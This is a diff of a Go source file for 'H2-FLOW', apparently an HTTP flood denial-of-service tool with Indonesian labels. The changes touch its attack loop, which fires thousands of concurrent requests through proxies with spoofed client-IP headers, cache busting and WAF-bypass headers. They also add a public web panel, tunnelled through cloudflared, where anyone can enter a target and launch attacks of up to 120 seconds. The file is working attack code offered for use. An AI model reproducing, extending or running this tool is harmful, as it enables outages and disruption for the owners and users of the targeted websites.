@@ -23,19 +23,18 @@ import (
 )
 
 const (
-	HAPUS  = "\033[0m"
-	MERAH  = "\033[31m"
-	IJO    = "\033[32m"
-	PUTIH  = "\033[37m"
-	CANDY  = "\033[91m"
-	PUCAT  = "\033[38;5;203m"
-	PUNYAMU = "\033[38;5;204m"
+	HAPUS         = "\033[0m"
+	MERAH         = "\033[31m"
+	IJO           = "\033[32m"
+	PUTIH         = "\033[37m"
+	CANDY         = "\033[91m"
+	PUCAT         = "\033[38;5;203m"
+	PUNYAMU       = "\033[38;5;204m"
 	PUNYA_LU_PUCAT = "\033[38;5;218m"
 	MASA_DEPAN_NYA = "\033[97m"
-
-	Speed = 7500
-	to    = 6 * time.Second
-	KEP   = 30 * time.Second
+	Speed         = 7500
+	to            = 6 * time.Second
+	KEP           = 30 * time.Second
 )
 
 type BPF struct {
@@ -303,7 +302,6 @@ func PHR(target string, ProxyX string) map[string]bool {
 		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 		ProxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
 	}
-
 	HeadersBypas := []string{
 		"X-Original-URL",
 		"X-Forwarded-Host",
@@ -604,9 +602,13 @@ func GPFO(origin string, host string) ORPL {
 }
 
 var (
-	stateMutex    sync.Mutex
-	attackState   string
-	cooldownUntil time.Time
+	stateMutex        sync.Mutex
+	attackState       string
+	cooldownUntil     time.Time
+	attackOwnerIP     string
+	attackOwnerTarget string
+	attackStartTime   time.Time
+	attackDuration    int
 )
 
 var (
@@ -618,9 +620,8 @@ var (
 var (
 	ipCooldownMutex sync.Mutex
 	ipCooldownMap   = make(map[string]time.Time)
-
-	ipTargetMutex sync.Mutex
-	ipTargetLast  = make(map[string]time.Time)
+	ipTargetMutex   sync.Mutex
+	ipTargetLast    = make(map[string]time.Time)
 )
 
 func getClientIP(r *http.Request) string {
@@ -643,9 +644,7 @@ func runAttack(tgt string, dur int, cookie string) {
 	if strings.HasPrefix(host, "www.") {
 		host = host[4:]
 	}
-
 	var PRX []*url.URL
-
 	file, err := os.Open("proxy.txt")
 	if err == nil {
 		defer file.Close()
@@ -676,14 +675,11 @@ func runAttack(tgt string, dur int, cookie string) {
 	if len(proxyIPs) > 0 {
 		ProxyX = proxyIPs[0]
 	}
-
 	ipPool := proxyIPs
 	if len(ipPool) == 0 {
 		ipPool = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
 	}
-
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-
 	var (
 		MaxP      int
 		MaxHead   int
@@ -696,13 +692,10 @@ func runAttack(tgt string, dur int, cookie string) {
 		VENC      []string
 		VCAC      []string
 	)
-
 	var wg sync.WaitGroup
 	wg.Add(10)
-
 	var probeDone int
 	var probeMu sync.Mutex
-
 	printProbe := func(name string) {
 		probeMu.Lock()
 		probeDone++
@@ -710,7 +703,6 @@ func runAttack(tgt string, dur int, cookie string) {
 		probeMu.Unlock()
 		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
 	}
-
 	go func() {
 		defer wg.Done()
 		MaxP = PMP(tgt)
@@ -761,10 +753,8 @@ func runAttack(tgt string, dur int, cookie string) {
 		VCAC = CACH(tgt)
 		printProbe("CACHE")
 	}()
-
 	wg.Wait()
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
-
 	wcs := make([]CLI, len(PRX))
 	for i, ProxyY := range PRX {
 		tr := &http.Transport{
@@ -774,8 +764,8 @@ func runAttack(tgt string, dur int, cookie string) {
 			}).DialContext,
 			DisableKeepAlives:     false,
 			DisableCompression:    false,
-			MaxIdleConns:          15000,
-			MaxIdleConnsPerHost:   7500,
+			MaxIdleConns:          10000,
+			MaxIdleConnsPerHost:   5000,
 			MaxConnsPerHost:       0,
 			IdleConnTimeout:       KEP,
 			TLSClientConfig: &tls.Config{
@@ -810,7 +800,6 @@ func runAttack(tgt string, dur int, cookie string) {
 		}
 		wcs[i] = CLI{client: client, ip: ip}
 	}
-
 	fmt.Printf("%s", MASA_DEPAN_NYA)
 	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
 	fmt.Printf("%s", PUNYA_LU_PUCAT)
@@ -825,7 +814,6 @@ func runAttack(tgt string, dur int, cookie string) {
 	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
 	fmt.Printf("%s", HAPUS)
 	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)
-
 	printInfo := func(label, value, status string) {
 		if status != "" {
 			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
@@ -843,7 +831,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				PUTIH, value, HAPUS)
 		}
 	}
-
 	printInfo("Author", "Diz Flyze Ofc              ", "True")
 	printInfo("Target", host, "")
 	printInfo("Port  ", "443                        ", "True")
@@ -865,7 +852,6 @@ func runAttack(tgt string, dur int, cookie string) {
 			PUTIH, IJO, "None", PUTIH)
 	}
 	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)
-
 	Start_Main := time.Now()
 	ctx, cancel := context.WithCancel(context.Background())
 	go func() {
@@ -878,7 +864,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				return
 			case <-ticker.C:
 				elapsed := int(time.Since(Start_Main).Seconds())
-				remaining := 120 - elapsed
+				remaining := dur - elapsed
 				if remaining < 0 {
 					remaining = 0
 				}
@@ -886,20 +872,18 @@ func runAttack(tgt string, dur int, cookie string) {
 					IJO, HAPUS,
 					PUTIH, HAPUS,
 					MERAH, HAPUS,
-					PUTIH, elapsed, 120, HAPUS,
+					PUTIH, elapsed, dur, HAPUS,
 					MERAH, IJO, "True", MERAH)
 			}
 		}
 	}()
 	var wg2 sync.WaitGroup
-	time.AfterFunc(120*time.Second, func() {
+	time.AfterFunc(time.Duration(dur)*time.Second, func() {
 		cancel()
 	})
-
 	type headerItem struct {
 		key, value string
 	}
-
 	for i := 0; i < Speed; i++ {
 		wg2.Add(1)
 		c := wcs[i%len(wcs)]
@@ -912,17 +896,14 @@ func runAttack(tgt string, dur int, cookie string) {
 				ref := VREF[rng.Intn(len(VREF))]
 				enc := VENC[rng.Intn(len(VENC))]
 				cacheCtrl := VCAC[rng.Intn(len(VCAC))]
-
 				FORIP := ipPool[rng.Intn(len(ipPool))]
 				realIP := cli.ip
 				if realIP == "" {
 					realIP = FORIP
 				}
-
 				SLOR := VORI[rng.Intn(len(VORI))]
 				OPRF := GPFO(SLOR, host)
 				prof := PFS[rng.Intn(len(PFS))]
-
 				params := []string{}
 				for j := 0; j < 2+rng.Intn(2); j++ {
 					key := CBP[rng.Intn(len(CBP))]
@@ -945,7 +926,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				if rng.Intn(10) == 0 {
 					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
 				}
-
 				var body io.Reader
 				if method == "POST" {
 					body = strings.NewReader("")
@@ -954,15 +934,12 @@ func runAttack(tgt string, dur int, cookie string) {
 				}
 				req, _ := http.NewRequest(method, targetURL, body)
 				headers := []headerItem{}
-
 				if method == "POST" {
 					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
 				}
-
 				headers = append(headers, headerItem{"User-Agent", ua})
 				headers = append(headers, headerItem{"Accept-Encoding", enc})
 				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})
-
 				if OPRF.Origin != "" && OPRF.Referer != "" {
 					headers = append(headers, headerItem{"Referer", OPRF.Referer})
 				} else if ref != "" {
@@ -972,7 +949,6 @@ func runAttack(tgt string, dur int, cookie string) {
 					headers = append(headers, headerItem{"Origin", OPRF.Origin})
 				}
 				headers = append(headers, headerItem{"Sec-Fetch-Site", OPRF.SecFetchSite})
-
 				headers = append(headers, headerItem{"Accept", prof.Accept})
 				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
 				headers = append(headers, headerItem{"Connection", "keep-alive"})
@@ -980,7 +956,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
 				headers = append(headers, headerItem{"If-Modified-Since", ifModifiedSince})
 				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})
-
 				if prof.SecChUa != "" {
 					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
 					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
@@ -991,7 +966,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				if prof.DNT != "" {
 					headers = append(headers, headerItem{"DNT", prof.DNT})
 				}
-
 				if rng.Intn(3) == 0 {
 					headers = append(headers, headerItem{"TE", "trailers"})
 				}
@@ -1013,7 +987,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				if rng.Intn(4) == 0 {
 					headers = append(headers, headerItem{"Data-Return", "false"})
 				}
-
 				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
 					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
 				}
@@ -1042,7 +1015,6 @@ func runAttack(tgt string, dur int, cookie string) {
 					}
 					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
 				}
-
 				var cookies []string
 				if cookie != "" {
 					cookies = append(cookies, cookie)
@@ -1055,7 +1027,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				if len(cookies) > 0 {
 					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
 				}
-
 				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
 				headers = append(headers, headerItem{"X-Real-IP", realIP})
 				headers = append(headers, headerItem{"Range", "bytes=0-"})
@@ -1067,7 +1038,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				headers = append(headers, headerItem{"X-Remote-IP", realIP})
 				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
 				headers = append(headers, headerItem{"X-Client-IP", realIP})
-
 				rng.Shuffle(len(headers), func(i, j int) {
 					headers[i], headers[j] = headers[j], headers[i]
 				})
@@ -1075,7 +1045,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				for _, h := range headers {
 					req.Header.Set(h.key, h.value)
 				}
-
 				resp, err := cli.client.Do(req)
 				if err == nil {
 					io.Copy(io.Discard, resp.Body)
@@ -1084,7 +1053,6 @@ func runAttack(tgt string, dur int, cookie string) {
 			}
 		}(c, i)
 	}
-
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	select {
@@ -1133,8 +1101,8 @@ const webHTML = `<!DOCTYPE html>
         .dot.ready { background:#2ecc71; }
         .dot.busy { background:#e74c3c; animation:pulse 1s infinite; }
         .dot.cooldown { background:#f39c12; animation:pulse 1s infinite; }
+        .dot.waiting { background:#3498db; animation:pulse 1s infinite; }
         @keyframes pulse { 0% { opacity:1; } 50% { opacity:0.4; } 100% { opacity:1; } }
-
         .info-grid {
             display:grid; grid-template-columns:1fr 1fr; gap:6px 30px;
             margin-bottom:30px; padding:0 2px; font-size:0.9rem;
@@ -1203,14 +1171,13 @@ const webHTML = `<!DOCTYPE html>
         <h1>H2-<span>FLOW</span></h1>
         <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">Ready</span></div>
     </div>
-
     <div class="info-grid">
-        <div class="item"><span class="label">target</span><span class="value" id="info-target">—</span></div>
-        <div class="item"><span class="label">duration</span><span class="value" id="info-duration">—</span></div>
-        <div class="item"><span class="label">cookie</span><span class="value" id="info-cookie">—</span></div>
-        <div class="item"><span class="label">status</span><span class="value" id="info-status">—</span></div>
+        <div class="item"><span class="label">Duration</span><span class="value" id="info-duration">—</span></div>
+        <div class="item"><span class="label">Cookie</span><span class="value" id="info-cookie">—</span></div>
+        <div class="item"><span class="label">Status</span><span class="value" id="info-status">—</span></div>
+        <div class="item"><span class="label">Cooldown</span><span class="value" id="info-ipcooldown">—</span></div>
+        <div class="item"><span class="label">Dilarang Sampai</span><span class="value" id="info-ipbanned">—</span></div>
     </div>
-
     <div class="section-title">new attack</div>
     <form id="attack-form" action="/start" method="post">
         <div class="form-group">
@@ -1219,8 +1186,8 @@ const webHTML = `<!DOCTYPE html>
         </div>
         <div class="form-row">
             <div class="form-group">
-                <label for="duration">Duration (max 60)</label>
-                <input type="number" id="duration" name="duration" value="60" min="1" max="60" required>
+                <label for="duration">Duration (max 120)</label>
+                <input type="number" id="duration" name="duration" value="60" min="1" max="120" required>
             </div>
             <div class="form-group">
                 <label for="cookie">Cookie (Optional)</label>
@@ -1229,17 +1196,17 @@ const webHTML = `<!DOCTYPE html>
         </div>
         <button type="submit" class="btn" id="launchBtn">Gass</button>
     </form>
-
     <div class="log-area">
         <div class="log-header"><span>Output Terminal</span><span id="log-count">0 Data</span></div>
         <div class="log-content" id="log-content">[system] Ready</div>
     </div>
-
     <div class="footer">YT : DIZFLYZE</div>
 </div>
-
 <script>
-    function updateUI(state, cooldownRemaining) {
+    var attackStartTime = null;
+    var timerInterval = null;
+
+    function updateUI(displayStatus, cooldownRemaining, state, startTime) {
         var dot = document.getElementById('statusDot');
         var statusText = document.getElementById('statusText');
         var infoStatus = document.getElementById('info-status');
@@ -1247,23 +1214,47 @@ const webHTML = `<!DOCTYPE html>
         var durationInput = document.getElementById('duration');
 
         if (state === 'attacking') {
+            if (startTime) {
+                attackStartTime = startTime;
+                if (!timerInterval) {
+                    timerInterval = setInterval(function() {
+                        var now = Math.floor(Date.now() / 1000);
+                        var elapsed = now - attackStartTime;
+                        if (elapsed < 0) elapsed = 0;
+                        var msg = displayStatus + ' (' + elapsed + 's)';
+                        statusText.textContent = msg;
+                        infoStatus.textContent = msg;
+                    }, 1000);
+                }
+            }
             dot.className = 'dot busy';
-            statusText.textContent = 'attacking';
-            infoStatus.textContent = 'attacking';
+            statusText.textContent = displayStatus + ' (0s)';
+            infoStatus.textContent = displayStatus + ' (0s)';
             btn.disabled = true;
-            btn.textContent = 'Waiting';
+            btn.textContent = 'Attacking';
             durationInput.disabled = true;
         } else if (state === 'cooldown') {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+                attackStartTime = null;
+            }
+            var msg = 'Tunggu ' + cooldownRemaining + 's';
             dot.className = 'dot cooldown';
-            statusText.textContent = 'cooldown ' + cooldownRemaining + 's';
-            infoStatus.textContent = 'cooldown (' + cooldownRemaining + 's)';
+            statusText.textContent = msg;
+            infoStatus.textContent = msg;
             btn.disabled = true;
             btn.textContent = 'Cooldown ' + cooldownRemaining + 's';
             durationInput.disabled = true;
         } else {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+                attackStartTime = null;
+            }
             dot.className = 'dot ready';
-            statusText.textContent = 'ready';
-            infoStatus.textContent = '—';
+            statusText.textContent = 'Ready';
+            infoStatus.textContent = 'Ready';
             btn.disabled = false;
             btn.textContent = 'Gass';
             durationInput.disabled = false;
@@ -1274,13 +1265,15 @@ const webHTML = `<!DOCTYPE html>
         fetch('/status')
             .then(function(res) { return res.json(); })
             .then(function(data) {
-                updateUI(data.state, data.cooldown || 0);
+                updateUI(data.display_status, data.cooldown || 0, data.state, data.start_time);
+                document.getElementById('info-ipcooldown').textContent = data.ip_cooldown > 0 ? data.ip_cooldown + 's' : '—';
+                document.getElementById('info-ipbanned').textContent = data.ip_banned > 0 ? data.ip_banned + 's' : '—';
             })
             .catch(function() {  });
     }
 
     fetchStatus();
-    setInterval(fetchStatus, 2000);
+    setInterval(fetchStatus, 1000);
 
     document.getElementById('attack-form').addEventListener('submit', function(e) {
         e.preventDefault();
@@ -1290,7 +1283,6 @@ const webHTML = `<!DOCTYPE html>
         var duration = formData.get('duration');
         var cookie = formData.get('cookie') || '—';
 
-        document.getElementById('info-target').textContent = target;
         document.getElementById('info-duration').textContent = duration + 's';
         document.getElementById('info-cookie').textContent = cookie;
 
@@ -1347,7 +1339,6 @@ func startWebAndTunnel() {
 		os.Exit(1)
 	}
 	port := listener.Addr().(*net.TCPAddr).Port
-
 	go func() {
 		ticker := time.NewTicker(10 * time.Minute)
 		for range ticker.C {
@@ -1359,7 +1350,6 @@ func startWebAndTunnel() {
 				}
 			}
 			ipCooldownMutex.Unlock()
-
 			ipTargetMutex.Lock()
 			now = time.Now()
 			for k, t := range ipTargetLast {
@@ -1370,16 +1360,15 @@ func startWebAndTunnel() {
 			ipTargetMutex.Unlock()
 		}
 	}()
-
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "text/html")
 		fmt.Fprint(w, webHTML)
 	})
-
 	http.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
 		stateMutex.Lock()
 		state := attackState
 		cooldown := 0
+		var startTime int64 = 0
 		if state == "cooldown" {
 			rem := time.Until(cooldownUntil)
 			if rem > 0 {
@@ -1389,20 +1378,61 @@ func startWebAndTunnel() {
 				if attackState == "cooldown" {
 					attackState = "idle"
 					state = "idle"
+					attackOwnerIP = ""
+					attackOwnerTarget = ""
+				}
+			}
+		} else if state == "attacking" {
+			startTime = attackStartTime.Unix()
+		}
+		ownerIP := attackOwnerIP
+		stateMutex.Unlock()
+		clientIP := getClientIP(r)
+		ipCooldownMutex.Lock()
+		ipCooldownRem := 0
+		if t, exists := ipCooldownMap[clientIP]; exists {
+			rem := time.Until(t)
+			if rem > 0 {
+				ipCooldownRem = int(rem.Seconds()) + 1
+			} else {
+				delete(ipCooldownMap, clientIP)
+			}
+		}
+		ipCooldownMutex.Unlock()
+		ipTargetMutex.Lock()
+		ipBannedRem := 0
+		prefix := clientIP + "|"
+		for key, t := range ipTargetLast {
+			if strings.HasPrefix(key, prefix) {
+				rem := time.Until(t)
+				if rem > 0 {
+					secs := int(rem.Seconds()) + 1
+					if secs > ipBannedRem {
+						ipBannedRem = secs
+					}
 				}
 			}
 		}
-		stateMutex.Unlock()
+		ipTargetMutex.Unlock()
+		displayStatus := "Ready"
+		if state == "attacking" {
+			if clientIP == ownerIP {
+				displayStatus = "Attacking"
+			} else {
+				displayStatus = "Antri Ya"
+			}
+		} else if state == "cooldown" {
+			displayStatus = fmt.Sprintf("Tunggu %ds", cooldown)
+		}
 		w.Header().Set("Content-Type", "application/json")
-		fmt.Fprintf(w, `{"state":"%s","cooldown":%d}`, state, cooldown)
+		fmt.Fprintf(w, `{"state":"%s","cooldown":%d,"ip_cooldown":%d,"ip_banned":%d,"display_status":"%s","start_time":%d}`,
+			state, cooldown, ipCooldownRem, ipBannedRem, displayStatus, startTime)
 	})
-
 	http.HandleFunc("/start", func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != http.MethodPost {
 			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 			return
 		}
-
 		tunnelMutex.Lock()
 		if !tunnelReady {
 			tunnelMutex.Unlock()
@@ -1411,37 +1441,39 @@ func startWebAndTunnel() {
 		}
 		tHost := tunnelHost
 		tunnelMutex.Unlock()
-
 		target := r.FormValue("target")
 		durationStr := r.FormValue("duration")
 		cookie := r.FormValue("cookie")
-
 		dur, err := strconv.Atoi(durationStr)
-		if err != nil || dur <= 0 {
+		if err != nil || dur <= 0 || dur > 120 {
 			stateMutex.Lock()
 			attackState = "idle"
+			attackOwnerIP = ""
+			attackOwnerTarget = ""
 			stateMutex.Unlock()
-			http.Error(w, "Invalid duration", http.StatusBadRequest)
+			http.Error(w, "Duration must be 1-120", http.StatusBadRequest)
 			return
 		}
 		if target == "" {
 			stateMutex.Lock()
 			attackState = "idle"
+			attackOwnerIP = ""
+			attackOwnerTarget = ""
 			stateMutex.Unlock()
 			http.Error(w, "Target required", http.StatusBadRequest)
 			return
 		}
-
 		parsedTarget, err := url.Parse(target)
 		if err != nil {
 			stateMutex.Lock()
 			attackState = "idle"
+			attackOwnerIP = ""
+			attackOwnerTarget = ""
 			stateMutex.Unlock()
 			http.Error(w, "Invalid target URL", http.StatusBadRequest)
 			return
 		}
 		targetHost := parsedTarget.Hostname()
-
 		normalize := func(h string) string {
 			h = strings.ToLower(h)
 			if strings.HasPrefix(h, "www.") {
@@ -1449,17 +1481,16 @@ func startWebAndTunnel() {
 			}
 			return h
 		}
-
 		if normalize(targetHost) == normalize(tHost) {
 			stateMutex.Lock()
 			attackState = "idle"
+			attackOwnerIP = ""
+			attackOwnerTarget = ""
 			stateMutex.Unlock()
 			http.Error(w, "You Are IDIOT", http.StatusBadRequest)
 			return
 		}
-
 		clientIP := getClientIP(r)
-
 		key := clientIP + "|" + target
 		ipTargetMutex.Lock()
 		lastTime, exists := ipTargetLast[key]
@@ -1470,7 +1501,6 @@ func startWebAndTunnel() {
 			return
 		}
 		ipTargetMutex.Unlock()
-
 		ipCooldownMutex.Lock()
 		if t, exists := ipCooldownMap[clientIP]; exists && now.Before(t) {
 			remaining := int(time.Until(t).Seconds()) + 1
@@ -1479,7 +1509,6 @@ func startWebAndTunnel() {
 			return
 		}
 		ipCooldownMutex.Unlock()
-
 		stateMutex.Lock()
 		state := attackState
 		if state == "cooldown" {
@@ -1492,6 +1521,8 @@ func startWebAndTunnel() {
 			} else {
 				attackState = "idle"
 				state = "idle"
+				attackOwnerIP = ""
+				attackOwnerTarget = ""
 			}
 		}
 		if state == "attacking" {
@@ -1500,28 +1531,27 @@ func startWebAndTunnel() {
 			return
 		}
 		attackState = "attacking"
+		attackOwnerIP = clientIP
+		attackOwnerTarget = target
+		attackStartTime = time.Now()
+		attackDuration = dur
 		stateMutex.Unlock()
-
-		go func(ip string, tgt string) {
-			runAttack(tgt, 120, cookie)
+		go func(ip string, tgt string, duration int) {
+			runAttack(tgt, duration, cookie)
 			stateMutex.Lock()
 			attackState = "cooldown"
 			cooldownUntil = time.Now().Add(30 * time.Second)
 			stateMutex.Unlock()
-
 			ipCooldownMutex.Lock()
 			ipCooldownMap[ip] = time.Now().Add(3 * time.Minute)
 			ipCooldownMutex.Unlock()
-
 			ipTargetMutex.Lock()
 			ipTargetLast[ip+"|"+tgt] = time.Now()
 			ipTargetMutex.Unlock()
-		}(clientIP, target)
-
+		}(clientIP, target, dur)
 		w.WriteHeader(http.StatusOK)
-		fmt.Fprintf(w, "Attack started on %s", target)
+		fmt.Fprintf(w, "Attack started on %s for %ds", target, dur)
 	})
-
 	server := &http.Server{Addr: fmt.Sprintf(":%d", port)}
 	go func() {
 		fmt.Printf("Web server running on http://localhost:%d\n", port)
@@ -1529,17 +1559,13 @@ func startWebAndTunnel() {
 			fmt.Println("Server error:", err)
 		}
 	}()
-
 	cmd := exec.Command("cloudflared", "tunnel", "--url", fmt.Sprintf("http://localhost:%d", port))
 	stdout, _ := cmd.StdoutPipe()
 	stderr, _ := cmd.StderrPipe()
-
 	var wg sync.WaitGroup
 	wg.Add(2)
-
 	tunnelURL := ""
 	var urlMu sync.Mutex
-
 	scanAndFind := func(rc io.ReadCloser) {
 		defer wg.Done()
 		scanner := bufio.NewScanner(rc)
@@ -1566,38 +1592,31 @@ func startWebAndTunnel() {
 			}
 		}
 	}
-
 	go scanAndFind(stdout)
 	go scanAndFind(stderr)
-
 	if err := cmd.Start(); err != nil {
 		fmt.Println("Gagal menjalankan cloudflared:", err)
 		fmt.Println("Pastikan cloudflared sudah terinstall (https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/)")
 		os.Exit(1)
 	}
-
 	done := make(chan struct{})
 	go func() {
 		wg.Wait()
 		close(done)
 	}()
-
 	select {
 	case <-done:
 	case <-time.After(30 * time.Second):
 		fmt.Println("Timeout menunggu tunnel URL.")
 	}
-
 	if tunnelURL == "" {
 		fmt.Println("Tidak dapat menemukan URL tunnel dari output cloudflared.")
 	} else {
 		fmt.Printf("\n🌐 Tunnel URL: %s\n", tunnelURL)
 	}
-
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	<-sig
-
 	fmt.Println("\nShutting down...")
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
@@ -1610,7 +1629,6 @@ func main() {
 		startWebAndTunnel()
 		return
 	}
-
 	if len(os.Args) < 2 {
 		fmt.Println("Cara pakai: H2-FLOW.go <target> <duration> <cookie>")
 		os.Exit(1)
@@ -1620,7 +1638,7 @@ func main() {
 	if len(os.Args) >= 3 {
 		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
 			if d > 120 {
-				fmt.Println("Durasi maksimal 60s")
+				fmt.Println("Durasi maksimal 120s")
 				dur = 120
 			} else {
 				dur = d
